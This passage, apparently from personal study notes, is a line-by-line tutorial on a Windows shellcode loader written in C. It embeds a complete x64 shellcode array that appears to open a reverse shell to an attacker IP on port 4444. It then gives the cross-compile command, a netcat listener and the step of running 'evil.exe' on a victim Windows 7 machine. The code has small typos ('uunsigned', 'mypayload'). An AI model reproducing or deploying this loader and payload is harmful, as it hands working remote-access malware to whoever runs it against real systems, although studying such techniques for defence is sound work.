|Process control|`exit`, `system`, `abort`|Terminate program or run commands|
|Conversions|`atoi`, `atof`, `strtol`|Convert strings to numbers|
|Random|`rand`, `srand`|Generate random numbers|

---
```c
#include <string.h>
```

This is the **standard C header** for working with **strings and memory**.

It provides functions like:

| Function | What it does                       |
| -------- | ---------------------------------- |
| `strlen` | Gets the length of a string        |
| `strcpy` | Copies one string to another       |
| `strcat` | Appends one string to another      |
| `strcmp` | Compares two strings               |
| `memcpy` | Copies blocks of memory            |
| `memset` | Fills memory with a constant value |
`<string.h>` is your **string toolbox** in C. Since C strings are just arrays of characters (not full objects like in C++), this header gives you the functions to manipulate them.

---
```C
uunsigned char my_payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x00\x6c"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
```

You're creating a **byte array** (`my_payload`) filled with **machine instructions** (**our payload**).
- `unsigned char` is used because each element is a **byte** (0–255).
- `\xfc`, `\x48`, etc., are **hex values** representing **CPU instructions**.
- The whole string is **compiled into raw machine code**.
- This code is meant to be **executed directly** in memory.
---
```C
unsigned int my_payload_len = sizeof(mypayload);
```
It calculates **the total size** (in bytes) of your `my_payload` array and stores that number into `my_payload_len`.
- This line **gets the size** of the `my_payload` array.
- It **saves** that size in `my_payload_len`.
- Later, the program **uses** `my_payload_len` when allocating memory, copying the payload, and setting memory protections.
---
```c
int main(void) {
```

- Standard starting point for a C or C++ program.
- `void` inside `main(void)` means it **takes no arguments**.
- `int` means it **returns an integer** (usually `0` if successful).
---
```c
void * my_payload_mem;
```

- `my_payload_mem` is a **pointer**.
- It points to a **block of memory** (but we don't know the type yet, that's why it's `void *` — a _generic pointer_).
- Later, this will point to **memory that stores your payload**.

✅ So: _"Reserve a variable that will hold the location where we put our payload."_

---
```c
BOOL rv;
```

- `BOOL` is a **Windows type** from `windows.h`.
- It’s just a fancy way of saying `int` that can be `TRUE` (1) or `FALSE` (0).
- Here, `rv` will be used to **check if Windows functions (like VirtualProtect)** succeeded or failed.

✅ So: _"Had Created a variable to store success/failure results."_

---
```c
HANDLE th;
```

- `HANDLE` is another Windows type.
- A **handle** is like a **special ID** Windows gives you to refer to things (files, threads, memory, etc.).
- `th` will store the **handle to the new thread** created later to run the payload.

✅ So: _"Reserve a variable to remember the thread we will create."_

---
```c
DWORD oldprotect = 0;
```

- `DWORD` = "Double Word" (32-bit unsigned integer) — another Windows type.
- `oldprotect` will store **the old memory protection flags** when we change memory permissions using `VirtualProtect`.
- (We have to save it because after making memory executable, we might want to restore it.)

✅ So: _"Create a variable to store the previous memory permissions."_

---
```c
my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

> **What is `VirtualAlloc`?**

It's a **Windows API** function that:
- **Reserves** or **commits** memory.
- Lets you define **how big**, **where**, and **what permissions** the memory should have.
- It returns a **pointer** to the memory block.

**Signature of `VirtualAlloc`**
```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

| Parameter          | Description                                                          |
| ------------------ | -------------------------------------------------------------------- |
| `lpAddress`        | Desired starting address (usually `NULL` to let system choose).      |
| `dwSize`           | Number of bytes to allocate.                                         |
| `flAllocationType` | Type of allocation - this is where `MEM_COMMIT`, `MEM_RESERVE` go.   |
| `flProtect`        | Memory protection - like `PAGE_READWRITE`, `PAGE_EXECUTE_READ`, etc. |

Returns:
- A pointer to the allocated memory (`LPVOID`)
- Or `NULL` if it fails.

**📦 What’s happening in this line?**

| Parameter                  | Meaning                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `0`                        | Let the OS pick the memory address (we’re not specifying a location).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `my_payload_len`           | Size of the memory block (same size as our shellcode).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| `MEM_COMMIT \| MEMRESERVE` | These are **memory allocation flags** used with the Windows API function `VirtualAlloc`.<br><br>`MEM_RESERVE` (`0x2000`)<br>➡ Reserves a **range of the virtual address space**.<br>➡ **No physical memory** is allocated yet.<br>➡ You’re basically saying: “Save this memory space for me, I’ll use it soon.”<br><br>`MEM_COMMIT` (`0x1000`)<br>➡ Actually allocates **physical memory (RAM or page file)**.<br>➡ You can now **read/write** to it.<br>    <br>`MEM_COMMIT \| MEM_RESERVE`<br>➡ Used together to **both reserve and commit** memory in a single step.<br>➡ Very common when you want memory that's ready to use right away. |
| `PAGE_READWRITE`           | Give it **read and write** access, so we can **copy the payload** into it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |

Now  we have a **memory buffer** that is:
- Reserved ✔️
- Writable ✔️
- Big enough for the payload ✔️

And `my_payload_mem` now **points to it**.

---
```c
RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
```
- `RtlMoveMemory` **copies memory** from a **source** to a **destination**.
- It's the Windows API version of `memcpy()` from C standard library.

**Function signature**:

```c
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  const VOID UNALIGNED *Source,
  SIZE_T Length
);
```

| Parameter     | Meaning                                       |
| :------------ | :-------------------------------------------- |
| `Destination` | Where you want to copy to (`my_payload_mem`). |
| `Source`      | What you want to copy (`my_payload`).         |
| `Length`      | How many bytes to copy (`my_payload_len`).    |

- You **allocated memory** (`my_payload_mem`) with `VirtualAlloc`.  
- You **copied** the **payload bytes** (`my_payload`) **into** that allocated memory using `RtlMoveMemory`.

```
┌─────────────┐           ┌────────────────┐
│ my_payload  │ --COPY--> │ my_payload_mem │
│  [SHELLCODE]│           │  [SHELLCODE]   │
└─────────────┘           └────────────────┘
```
So now, our payload is **sitting inside writable memory** in your process.

---
```c
rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
```
- **VirtualProtect** → Changes the **memory protection** of a region of memory. 
- **Parameters**:
    - `my_payload_mem` → Start of the memory region (where you copied the payload).
    - `my_payload_len` → Size (how many bytes) of the memory you want to protect.
    - `PAGE_EXECUTE_READ` → New memory permissions → now **READ + EXECUTE** (no more writing!).
    - `&oldprotect` → A pointer to a variable where the **previous** protection (like PAGE_READWRITE) is saved.
- **rv** → Return value: if `rv != 0`, the call succeeded.

Initially, when we `VirtualAlloc` memory, it was **PAGE_READWRITE** ( can read and write).  
**But you cannot execute code** from that memory while it's just read-write.

| Time                   | Memory Protection | Can Read? | Can Write? | Can Execute? |
| :--------------------- | :---------------- | :-------- | :--------- | :----------- |
| After `VirtualAlloc`   | PAGE_READWRITE    | ✅         | ✅          | ❌            |
| After `VirtualProtect` | PAGE_EXECUTE_READ | ✅         | ❌          | ✅            |

---
```c
if (rv != 0){
	th = CreateThread(0,0,(LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
}
```

- `if (rv != 0)`  
    → Check if `VirtualProtect` succeeded.  
    → If yes, proceed to run the payload.

**`CreateThread` line:**

```c
th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
```

**Meaning:**

- `CreateThread` starts a **new thread** inside your process.
- It runs the function **located at `my_payload_mem`** — which is your **shellcode**.

> `CreateThread` function **signature**:

```c
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes, // security settings (usually NULL)
  SIZE_T                   dwStackSize,        // size of thread stack (usually 0 = default)
  LPTHREAD_START_ROUTINE   lpStartAddress,     // pointer to function to execute
  LPVOID                   lpParameter,        // parameter to pass to the function (can be NULL)
  DWORD                    dwCreationFlags,    // creation options (0 = run immediately)
  LPDWORD                  lpThreadId          // pointer to thread ID (can be NULL)
);
```

| Argument             | What we passed                           | Meaning                          |
| :------------------- | :--------------------------------------- | :------------------------------- |
| `lpThreadAttributes` | `0`                                      | Default security                 |
| `dwStackSize`        | `0`                                      | Default stack size               |
| `lpStartAddress`     | `(LPTHREAD_START_ROUTINE)my_payload_mem` | Pointer to your shellcode memory |
| `lpParameter`        | `0`                                      | No parameters                    |
| `dwCreationFlags`    | `0`                                      | Start immediately                |
| `lpThreadId`         | `0`                                      | No need to save Thread ID        |
> What is `LPTHREAD_START_ROUTINE`?

It’s a **Windows-defined function pointer type**. You can find it in `Windows.h`, and it looks like this:

**Analogy:**
Let’s say `int (*f)(int)` is a function pointer. If we write:
```c
(int (*))somePointer  // Cast: "Treat this pointer like a function"
somePointer(int)      // Call: "Call this pointer like a function"
```

>In short:

`(LPTHREAD_START_ROUTINE)my_payload_mem` is **telling Windows to execute your payload** as a function inside a thread.


```c
WaitForSingleObject(th, -1);
```

**Meaning:**
- **Wait for the thread to finish.**
- `-1` (or `INFINITE`) → wait **forever** (no timeout).
- So the main process **pauses and waits** while the shellcode runs.

|Part|What happens|
|:--|:--|
|`CreateThread`|Creates a new thread that **runs your shellcode**|
|`WaitForSingleObject`|Main program **waits for shellcode to finish**|

---

## Let's Compile

**On Attackers' Machine:** `x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
![[images/Pasted image 20250426162740.png]]

## Run command
### Start listener on Attacker's Machine

```shell
nc -lvnp 4444
```

![[images/Pasted image 20250426163013.png]]

### Transfer and Run evil.exe to victim Machine(Windows 7)
```shell
./evil.exe
```
![[images/Pasted image 20250426163643.png]]